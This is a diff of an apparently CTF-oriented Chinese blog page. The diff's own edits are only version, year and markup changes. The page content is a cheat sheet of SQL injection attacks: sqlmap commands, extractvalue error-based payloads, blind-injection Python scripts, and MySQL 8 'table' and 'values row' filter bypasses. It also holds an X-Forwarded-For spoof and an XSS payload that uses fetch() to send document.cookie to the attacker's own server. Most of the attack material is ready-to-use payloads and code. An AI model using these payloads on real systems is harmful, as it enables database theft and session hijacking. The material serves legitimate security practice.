@@ -3,7 +3,7 @@
 <head>
   <link href="https://gmpg.org/xfn/11" rel="profile">
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="generator" content="Hugo 0.87.0" />
+  <meta name="generator" content="Hugo 0.91.2" />
 
   
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -44,7 +44,7 @@
       </ul>
     </nav>
 
-    <p>&copy; 2021. All rights reserved. </p>
+    <p>&copy; 2022. All rights reserved. </p>
   </div>
 </aside>
 
@@ -54,7 +54,7 @@
   <time datetime=2021-08-19T21:54:55&#43;0800 class="post-date">2021-08-19 21:54:55</time>
   <h2 id="sqlmap">SQLMap</h2>
 <p>直接使用sqlmap</p>
-<pre><code>// 判断注入点
+<pre tabindex="0"><code>// 判断注入点
 // GET请求
 sqlmap.py -u http://host:port/?id=1
 // POST请求
@@ -96,34 +96,34 @@ flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;
             <span style="color:#66d9ef">break</span>
 </code></pre></div><h2 id="select--from-表名-where-id--输入的id-类型"><code>select * from &lt;表名&gt; where id=</code> + <code>输入的id</code> 类型</h2>
 <p>获取数据库名</p>
-<pre><code>// extractvalue 从某个xml文件里，找到某个路径的元素
+<pre tabindex="0"><code>// extractvalue 从某个xml文件里，找到某个路径的元素
 // 参数1是随便传的
 // concat(0x7e,(select database()),0x7e)) 含义为生成字符串  &quot;~&lt;数据库名&gt;~&quot;
 // 因为'~'字符不是合法的路径字符，可能报错，错误里会展示 &quot;~&lt;数据库名&gt;~&quot; ， 也就得到了表名
 id=1 and (extractvalue(1,concat(0x7e,(select database()),0x7e)))
 </code></pre><p>获取表名</p>
-<pre><code>// 基本就是利用 
+<pre tabindex="0"><code>// 基本就是利用 
 // select group_concat(table_name) from information_schema.tables where table_schema=database()
 // 语句，把所有的表名串起来，通过错误的形式展示出来
 id=1 and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))
 </code></pre><p>获取列名</p>
-<pre><code>// 基本就是利用
+<pre tabindex="0"><code>// 基本就是利用
 // select group_concat(column_name) from information_schema.columns where table_name='&lt;table name&gt;'
 // 语句，将某张表所有的列的字段，全部串起来
 id=1 and (extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='&lt;表名&gt;'),0x7e)))
 </code></pre><p>获取数据</p>
-<pre><code>id=1 and (extractvalue(1,concat(0x7e,(select &lt;字段&gt; from &lt;表名&gt;),0x7e)))
+<pre tabindex="0"><code>id=1 and (extractvalue(1,concat(0x7e,(select &lt;字段&gt; from &lt;表名&gt;),0x7e)))
 // 有可能有长度限制，可以使用mid函数获取后半段
 id=1 and (extractvalue(1,concat(0x7e,(select mid(&lt;字段名&gt;,&lt;开始idx&gt;,&lt;长度&gt;) from &lt;表名&gt;),0x7e)))
 </code></pre><h2 id="select--from-表名-where-name--输入的name---类型"><code>select * from &lt;表名&gt; where name='</code> + <code>输入的name</code> + <code>'</code> 类型</h2>
-<pre><code>// 如果有结果
+<pre tabindex="0"><code>// 如果有结果
 admin' and (select 'a'='a')='1
 // 如果没有结果
 admin' and (select 'a'='b')='1
 // 说明把输入数据当做指令执行，存在注入
 
 </code></pre><p>执行<code>select 'a'='a';</code>的返回结果，跟<code>1</code>,<code>'1'</code>比较结果，都是true.</p>
-<pre><code>MySQL []&gt; select (select 'a'='a')=1;
+<pre tabindex="0"><code>MySQL []&gt; select (select 'a'='a')=1;
 +--------------------+
 | (select 'a'='a')=1 |
 +--------------------+
@@ -138,7 +138,7 @@ MySQL []&gt; select (select 'a'='a')='1';
 |                    1 |
 +----------------------+
 1 row in set (0.00 sec)
-</code></pre><pre><code>import requests
+</code></pre><pre tabindex="0"><code>import requests
 
 url = &quot;http://host:port/path&quot;
 data = {
@@ -162,7 +162,7 @@ for i in range(1, 50):
 </code></pre><h2 id="对于mysql80服务器过滤select命令-且id类型">对于mysql8.0,服务器过滤select命令, 且id类型</h2>
 <p>如果<code>id=1</code> 与 <code>id=2-1</code> 结果一致，说明<code>2-1</code>被执行了，存在注入。</p>
 <p>获取当前数据库名</p>
-<pre><code>import requests
+<pre tabindex="0"><code>import requests
 
 def get_database(url, params):
     database = &quot;&quot;
@@ -182,7 +182,7 @@ params = {
 }
 get_database(url, params)
 </code></pre><p>获取表名</p>
-<pre><code>import requests
+<pre tabindex="0"><code>import requests
 
 def get_table(url, params):
     table = &quot;&quot;
@@ -204,7 +204,7 @@ get_table(url, params) # 获得表名
 </code></pre><p>获取行数，可以使用 <code>table 表名 limit 0, 1</code>.
 表示从表中，获取每行元素，获取偏移0，长度1的数据。
 如果跟 <code>''</code> 比较，没有报错，说明表只有一列。</p>
-<pre><code>MySQL [local_test]&gt; show create table names;
+<pre tabindex="0"><code>MySQL [local_test]&gt; show create table names;
 +-------+-----------------------------------------------------------------------------------------------------------------------------+
 | Table | Create Table                                                                                                                |
 +-------+-----------------------------------------------------------------------------------------------------------------------------+
@@ -246,7 +246,7 @@ ERROR 1241 (21000): Operand should contain 1 column(s)
 MySQL [local_test]&gt;
 </code></pre><p>因此，<code>id=1) and ('')&lt;(table 表名 limit 0,1</code> 可以用于判断，表里有多少列。</p>
 <p>然后利用MID函数，与sleep，逐个比较，获取数据。</p>
-<pre><code>import requests
+<pre tabindex="0"><code>import requests
 
 def get_flag(url, params):
     flag = &quot;&quot;
@@ -266,14 +266,14 @@ params = {
 }
 get_flag(url, params)
 </code></pre><p>或者直接union</p>
-<pre><code>id=1) union values row(101,(table 表)) #
+<pre tabindex="0"><code>id=1) union values row(101,(table 表)) #
 
 </code></pre><h2 id="inner-ip-only">inner ip only</h2>
-<pre><code>curl -H &quot;X-Forwarded-For: 127.0.0.1&quot; http://ip:port/path
+<pre tabindex="0"><code>curl -H &quot;X-Forwarded-For: 127.0.0.1&quot; http://ip:port/path
 </code></pre><h2 id="url">url</h2>
 <p>base64内容：</p>
-<pre><code>fetch('自己的http服务地址/?target='+escape(document.cookie))
-</code></pre><pre><code>http://ip:port/?next=urn:javascript:eval(atob('base64编码'))
+<pre tabindex="0"><code>fetch('自己的http服务地址/?target='+escape(document.cookie))
+</code></pre><pre tabindex="0"><code>http://ip:port/?next=urn:javascript:eval(atob('base64编码'))
 </code></pre>
 </div>
 
